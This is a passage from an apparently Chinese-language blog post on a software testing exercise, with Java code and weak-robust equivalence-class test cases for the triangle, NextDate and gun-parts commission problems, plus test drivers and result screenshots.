class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"></span><br><span class="line">        NextDate nextDate = <span class="keyword">new</span> NextDate();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查输入的日期是否符合要求</span></span><br><span class="line">        nextDate.dateCheckFunction(scanner, nextDate);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据nextDateFunction函数获取后一天的日期</span></span><br><span class="line">        String dayAfter = nextDate.nextDateFunction(nextDate.year, nextDate.month, nextDate.day);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"The day after is "</span> + dayAfter);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="佣金问题"><a href="#佣金问题" class="headerlink" title="佣金问题"></a>佣金问题</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> procs;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GunSale</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 机枪</span></span><br><span class="line">    <span class="keyword">int</span> part1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> part1Price = <span class="number">45</span>;</span><br><span class="line">    <span class="comment">// 枪托</span></span><br><span class="line">    <span class="keyword">int</span> part2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> part2Price = <span class="number">30</span>;</span><br><span class="line">    <span class="comment">// 枪管</span></span><br><span class="line">    <span class="keyword">int</span> part3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> part3Price = <span class="number">25</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 销售数量总和</span></span><br><span class="line">    <span class="keyword">int</span> amountSum = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 总销售额</span></span><br><span class="line">    <span class="keyword">int</span> priceSum = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 佣金总和</span></span><br><span class="line">    <span class="keyword">double</span> commissionSum = <span class="number">0.00f</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 枪部件输入、检查函数</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">amountInputAndCheck</span><span class="params">(Scanner scanner, GunSale gunSale)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Please input the amount of a gun's every part"</span>);</span><br><span class="line">        System.out.println(<span class="string">"----------------------------------------------"</span>);</span><br><span class="line">        System.out.println(<span class="string">"------------机枪----枪托----枪管------------"</span>);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 输入的数量赋值给gunSale对象，且对其销售数量进行检查</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.printf(<span class="string">"请输入机枪销售额："</span>);</span><br><span class="line">            gunSale.part1 = scanner.nextInt();</span><br><span class="line">        &#125; <span class="keyword">while</span> (gunSale.part1 &lt; <span class="number">1</span> || gunSale.part1 &gt; <span class="number">70</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.printf(<span class="string">"请输入枪托销售额："</span>);</span><br><span class="line">            gunSale.part2 = scanner.nextInt();</span><br><span class="line">        &#125; <span class="keyword">while</span> (gunSale.part2 &lt; <span class="number">1</span> || gunSale.part1 &gt; <span class="number">80</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            System.out.printf(<span class="string">"请输入枪管："</span>);</span><br><span class="line">            gunSale.part3 = scanner.nextInt();</span><br><span class="line">        &#125; <span class="keyword">while</span> (gunSale.part3 &lt; <span class="number">1</span> || gunSale.part1 &gt; <span class="number">90</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 销售数目总和</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">amountSumFunction</span><span class="params">(GunSale gunSale)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> amount = gunSale.part1 + gunSale.part2 + gunSale.part3;</span><br><span class="line">        gunSale.amountSum = amountSum;</span><br><span class="line">        <span class="keyword">return</span> amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 总销售额</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">priceSumFunction</span><span class="params">(GunSale gunSale)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> priceSum = gunSale.part1 * gunSale.part1Price + gunSale.part2 * gunSale.part2Price</span><br><span class="line">                + gunSale.part3 * gunSale.part3Price;</span><br><span class="line">        gunSale.priceSum = priceSum;</span><br><span class="line">        <span class="keyword">return</span> priceSum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">double</span> <span class="title">commissionSum</span><span class="params">(GunSale gunSale)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> commissionSum = <span class="number">0.00f</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (gunSale.priceSum &lt;= <span class="number">1000</span>) &#123;</span><br><span class="line">            commissionSum = gunSale.priceSum * <span class="number">0.1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (gunSale.priceSum &lt;= <span class="number">1800</span>) &#123;</span><br><span class="line">            commissionSum = (gunSale.priceSum - <span class="number">1000</span>) * <span class="number">0.15</span> + <span class="number">100</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            commissionSum = (gunSale.priceSum - <span class="number">1800</span>) * <span class="number">0.20</span> + <span class="number">220</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        gunSale.commissionSum = commissionSum;</span><br><span class="line">        <span class="keyword">return</span> commissionSum;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        GunSale gunSale = <span class="keyword">new</span> GunSale();</span><br><span class="line">        gunSale.amountInputAndCheck(scanner, gunSale);</span><br><span class="line">        <span class="keyword">int</span> amountSum = gunSale.amountSumFunction(gunSale);</span><br><span class="line">        <span class="keyword">int</span> priceSum = gunSale.priceSumFunction(gunSale);</span><br><span class="line">        <span class="keyword">double</span> commissionSum = gunSale.commissionSum(gunSale);</span><br><span class="line">        System.out.println(String.format(<span class="string">"=====销售总数是：%1d， 总销售额：%2d，佣金总和：%3f====="</span></span><br><span class="line">                , amountSum, priceSum, commissionSum));</span><br><span class="line">        System.out.println(<span class="string">"----------------------------------------------"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试用例设计"><a href="#测试用例设计" class="headerlink" title="测试用例设计"></a>测试用例设计</h2><h3 id="三角形问题：测试用例"><a href="#三角形问题：测试用例" class="headerlink" title="三角形问题：测试用例"></a>三角形问题：测试用例</h3><p>使用弱健壮（Weak Robust）的等价类测试用例设计方法：</p><ol><li>划分有效等价类和无效等价类（序号是每一个等价类唯一的编号）</li></ol><table><thead><tr><th>输入条件</th><th>有效等价类</th><th>无效等价类</th></tr></thead><tbody><tr><td>是否满足边长输入要求</td><td>1. 1&lt;=a&lt;=100<br />2. 1&lt;=b&lt;=100<br />3. 1&lt;=c&lt;=100</td><td>4. a&lt;1 || a&gt;100 <br />5. b&lt;1 || b&gt;100<br />6. c&lt;1 || c&gt;100</td></tr><tr><td>是否为非三角形</td><td>7. a+b &gt; c<br />8. a+c &gt; b<br />9. b+c &gt; a</td><td>10. a+b &lt;= c<br />11. a+c &lt;= b<br />12. b+c &lt;= a</td></tr><tr><td>是否为等腰三角形</td><td>13. a=b <br />14. b=c<br />15. c=a</td><td>16. a!=b &amp;&amp; b!=c &amp;&amp; c!=a</td></tr><tr><td>是否为等边三角形</td><td>17. a=b &amp;&amp; b=c &amp;&amp; c=a</td><td>18. a != b<br />19. b != c<br />20. c != a</td></tr></tbody></table><p>对有效等价类设计测试用例：</p><table><thead><tr><th>测试用例（a, b, c）</th><th>预期输出</th><th>覆盖编号</th></tr></thead><tbody><tr><td>7, 8, 9</td><td>不等边三角形</td><td>1, 2, 3, 7, 8, 9</td></tr><tr><td>7, 7, 9<br />7, 8, 8<br />9, 8, 9</td><td>等腰三角形</td><td>1, 2, 3, 7, 8, 9<br />13<br />14<br />15</td></tr><tr><td>7, 7, 7</td><td>等边三角形</td><td>1, 2, 3, 7, 8, 9<br />13<br />14<br />15<br />17</td></tr></tbody></table><p>对无效等价类设计测试用例：</p><table><thead><tr><th>测试用例（a, b, c）</th><th>预期输出</th><th>覆盖编号</th></tr></thead><tbody><tr><td>0, 1, 1<br />1, 1, 101<br />1, 0, 1<br />1, 101, 1<br />1, 1, 0<br /></td><td>非三角形</td><td>4<br />5<br />6</td></tr><tr><td>7, 8, 9</td><td>非等腰三角形</td><td>16</td></tr></tbody></table><p>以上组成对三角形问题的弱健壮等价类测试用例设计。</p><h3 id="NextDate：测试用例"><a href="#NextDate：测试用例" class="headerlink" title="NextDate：测试用例"></a>NextDate：测试用例</h3><ol><li>划分有效等价类和无效等价类（序号是每一个等价类唯一的编号）</li></ol><table><thead><tr><th>输入条件</th><th>有效等价类</th><th>无效等价类</th></tr></thead><tbody><tr><td>是否满足月份输入要求</td><td>1. month &gt;= 1<br />2. month &lt;= 12</td><td>3. month &lt; 1<br />4. month &gt; 12</td></tr><tr><td>否满足日期输入要求</td><td>5. day &gt;= 1<br />6. day &lt;= 31</td><td>7. day&lt;1<br />8. day&gt;31</td></tr><tr><td>否满足年份输入要求</td><td>9. year&gt;=1912<br />10. year&lt;=2050</td><td>11. year&lt;1912<br />12. year&gt;2050</td></tr></tbody></table><p>对有效等价类设计测试用例：</p><table><thead><tr><th>测试用例（year, month, day）</th><th>预期输出</th><th>覆盖编号</th></tr></thead><tbody><tr><td>1981, 6, 15</td><td>1981-6-16</td><td>1, 2, 5, 6, 9, 10</td></tr></tbody></table><p>对无效等价类设计测试用例：</p><table><thead><tr><th>测试用例（year, month, day）</th><th>预期输出</th><th>覆盖编号</th></tr></thead><tbody><tr><td>1911, 6, 15</td><td>年份超出范围</td><td>11</td></tr><tr><td>2051, 6, 15</td><td>年份超出范围</td><td>12</td></tr><tr><td>1981, 0, 15</td><td>月份超出范围</td><td>3</td></tr><tr><td>1981, 13, 15</td><td>月份超出范围</td><td>4</td></tr><tr><td>1981, 6, 0</td><td>日期超出范围</td><td>7</td></tr><tr><td>1981, 6, 32</td><td>日期超出范围</td><td>8</td></tr></tbody></table><p>以上组成对NextDate的弱健壮等价类测试用例设计。</p><h3 id="佣金问题：测试用例"><a href="#佣金问题：测试用例" class="headerlink" title="佣金问题：测试用例"></a>佣金问题：测试用例</h3><p>nLock: 步枪机的销量</p><p>nStock: 枪托的销量</p><p>nBarrel: 枪管的销量</p><ol><li>划分有效等价类和无效等价类（序号是每一个等价类唯一的编号）</li></ol><table><thead><tr><th>输入条件</th><th>有效等价类</th><th>无效等价类</th></tr></thead><tbody><tr><td>是否满足最低销售数量要求</td><td>1. nLock &gt;= 1<br />2. nStock &gt;= 1<br />3. nBarrel &gt;= 1</td><td>4. nLock &lt; 1<br />5. nStock &lt; 1<br />6. nBarrel &lt; 1</td></tr><tr><td>步枪机是否满足生产限额</td><td>7. nLock &lt;= 70</td><td>8. nLock &gt; 70</td></tr><tr><td>枪托是否满足生产限额</td><td>9. nStock &lt;= 80</td><td>10. nStock &gt; 80</td></tr><tr><td>枪管是否满足生产限额</td><td>11. nBarrel &lt;= 90</td><td>12. nBarrel &gt; 90</td></tr></tbody></table><p>对有效等价类设计测试用例：</p><table><thead><tr><th>测试用例（nLock, nStock, nBarrel）</th><th>预期输出</th><th>覆盖编号</th></tr></thead><tbody><tr><td>35, 40, 45</td><td>销售总数是：120， 总销售额：3900，佣金总和：640.0</td><td>1, 2, 3, 7, 9, 13</td></tr></tbody></table><p>对无效等价类设计测试用例：</p><table><thead><tr><th>测试用例（nLock, nStock, nBarrel）</th><th>预期输出</th><th>覆盖编号</th></tr></thead><tbody><tr><td>0, 40, 45</td><td>步枪机不满足最低销售数量</td><td>4</td></tr><tr><td>35, 0, 45</td><td>枪托不满足最低销售数量</td><td>5</td></tr><tr><td>35, 40, 0</td><td>枪管不满足最低销售数量</td><td>6</td></tr><tr><td>75, 40, 45</td><td>步枪机数量超出生产限额</td><td>8</td></tr><tr><td>35, 85, 45</td><td>枪托数量超出生产限额</td><td>10</td></tr><tr><td>35, 40, 95</td><td>枪管数量超出生产限额</td><td>12</td></tr></tbody></table><p>以上组成对佣金问题的弱健壮等价类测试用例设计。</p><h2 id="测试代码及结果分析"><a href="#测试代码及结果分析" class="headerlink" title="测试代码及结果分析"></a>测试代码及结果分析</h2><h3 id="三角形问题：测试代码"><a href="#三角形问题：测试代码" class="headerlink" title="三角形问题：测试代码"></a>三角形问题：测试代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exps;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> procs.TriangleProc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TriangleTesting_two</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkShape</span><span class="params">(<span class="keyword">int</span> sideA, <span class="keyword">int</span> sideB, <span class="keyword">int</span> sideC)</span> </span>&#123;</span><br><span class="line">        TriangleProc triangleProc = <span class="keyword">new</span> TriangleProc();</span><br><span class="line"></span><br><span class="line">        triangleProc.sideA = sideA;</span><br><span class="line">        triangleProc.sideB = sideB;</span><br><span class="line">        triangleProc.sideC = sideC;</span><br><span class="line"></span><br><span class="line">        triangleProc.verifyLengthRange(triangleProc.sideA);</span><br><span class="line">        triangleProc.verifyLengthRange(triangleProc.sideB);</span><br><span class="line">        triangleProc.verifyLengthRange(triangleProc.sideC);</span><br><span class="line"></span><br><span class="line">        triangleProc.verifyFormPrinciple(triangleProc);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"三角形类型为："</span> + triangleProc.judgeTriangleType(triangleProc));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        TriangleTesting_two triangleTesting_two = <span class="keyword">new</span> TriangleTesting_two();</span><br><span class="line">        <span class="comment">// 对有效等价类的测试</span></span><br><span class="line">        <span class="comment">// 不等边三角形</span></span><br><span class="line">        triangleTesting_two.checkShape(<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>);</span><br><span class="line">        <span class="comment">// 等腰三角形（以下三个）</span></span><br><span class="line">        triangleTesting_two.checkShape(<span class="number">7</span>, <span class="number">7</span>, <span class="number">9</span>);</span><br><span class="line">        triangleTesting_two.checkShape(<span class="number">7</span>, <span class="number">8</span>, <span class="number">8</span>);</span><br><span class="line">        triangleTesting_two.checkShape(<span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>);</span><br><span class="line">        <span class="comment">// 等边三角形</span></span><br><span class="line">        triangleTesting_two.checkShape(<span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>);</span><br><span class="line">        System.out.println(<span class="string">"=====================================\n"</span>);</span><br><span class="line">        <span class="comment">// 对无效等价类的测试</span></span><br><span class="line">        <span class="comment">// 非三角形（以下5个）</span></span><br><span class="line">        triangleTesting_two.checkShape(<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        triangleTesting_two.checkShape(<span class="number">1</span>, <span class="number">1</span>, <span class="number">101</span>);</span><br><span class="line">        triangleTesting_two.checkShape(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        triangleTesting_two.checkShape(<span class="number">1</span>, <span class="number">101</span>, <span class="number">1</span>);</span><br><span class="line">        triangleTesting_two.checkShape(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        triangleTesting_two.checkShape(<span class="number">1</span>, <span class="number">1</span>, <span class="number">101</span>);</span><br><span class="line">        <span class="comment">// 非等腰三角形</span></span><br><span class="line">        triangleTesting_two.checkShape(<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="三角形问题：测试结果"><a href="#三角形问题：测试结果" class="headerlink" title="三角形问题：测试结果"></a>三角形问题：测试结果</h3><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191223033536.png" style="zoom:50%;" /><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191223033610.png" style="zoom:50%;" /><p>以上为对三角形问题代码的弱健壮等价类测试，满足预期。</p><h3 id="NextDate：测试代码"><a href="#NextDate：测试代码" class="headerlink" title="NextDate：测试代码"></a>NextDate：测试代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exps;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> procs.NextDate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NextDateTesting_two</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 驱动模块</span></span><br><span class="line"><span class="comment">     * 函数：dateCheckFunction</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> nextDate</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">dateCheckFunction</span><span class="params">(NextDate nextDate, <span class="keyword">int</span> year, <span class="keyword">int</span> month, <span class="keyword">int</span> day)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (year &gt;= <span class="number">1912</span> &amp;&amp; year &lt;= <span class="number">2050</span>) &#123;</span><br><span class="line">            nextDate.year = year;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"The YEAR is out of range"</span>);</span><br><span class="line">            flag = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (month &gt;= <span class="number">1</span> &amp;&amp; month &lt;= <span class="number">12</span>) &#123;</span><br><span class="line">            nextDate.month = month;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"The MONTH is out of range"</span>);</span><br><span class="line">            flag = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (day &gt;= <span class="number">1</span> &amp;&amp; day &lt;= <span class="number">31</span>) &#123;</span><br><span class="line">            nextDate.day = day;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"The DAY is out of range"</span>);</span><br><span class="line">            flag = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkNextDate</span><span class="params">(<span class="keyword">int</span> year, <span class="keyword">int</span> month, <span class="keyword">int</span> day)</span> </span>&#123;</span><br><span class="line">        NextDate nextDate = <span class="keyword">new</span> NextDate();</span><br><span class="line">        NextDateTesting_two nextDateTesting_two = <span class="keyword">new</span> NextDateTesting_two();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查输入的日期是否符合要求</span></span><br><span class="line">        <span class="keyword">if</span> (nextDateTesting_two.dateCheckFunction(nextDate, year, month, day)) &#123;</span><br><span class="line">            <span class="comment">// 根据nextDateFunction函数获取后一天的日期</span></span><br><span class="line">            String dayAfter = nextDate.nextDateFunction(nextDate.year,</span><br><span class="line">                    nextDate.month, nextDate.day);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"The day after is "</span> + dayAfter);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        NextDateTesting_two nextDateTesting_two = <span class="keyword">new</span> NextDateTesting_two();</span><br><span class="line">        <span class="comment">// 对有效等价类设计测试用例</span></span><br><span class="line">        nextDateTesting_two.checkNextDate(<span class="number">1981</span>, <span class="number">6</span>, <span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对无效等价类设计测试用例</span></span><br><span class="line">        nextDateTesting_two.checkNextDate(<span class="number">1911</span>, <span class="number">6</span>, <span class="number">15</span>);</span><br><span class="line">        nextDateTesting_two.checkNextDate(<span class="number">2051</span>, <span class="number">6</span>, <span class="number">15</span>);</span><br><span class="line">        nextDateTesting_two.checkNextDate(<span class="number">1981</span>, <span class="number">0</span>, <span class="number">15</span>);</span><br><span class="line">        nextDateTesting_two.checkNextDate(<span class="number">1981</span>, <span class="number">13</span>, <span class="number">15</span>);</span><br><span class="line">        nextDateTesting_two.checkNextDate(<span class="number">1981</span>, <span class="number">6</span>, <span class="number">0</span>);</span><br><span class="line">        nextDateTesting_two.checkNextDate(<span class="number">1981</span>, <span class="number">6</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="NextDate：测试结果"><a href="#NextDate：测试结果" class="headerlink" title="NextDate：测试结果"></a>NextDate：测试结果</h3><p>以下为控制台中输出的测试结果：</p><img src="https://image-host-toky.oss-cn-shanghai.aliyuncs.com/20191223035556.png" style="zoom:50%;" /><p>符合测试预期。</p><h3 id="佣金问题：测试代码"><a href="#佣金问题：测试代码" class="headerlink" title="佣金问题：测试代码"></a>佣金问题：测试代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 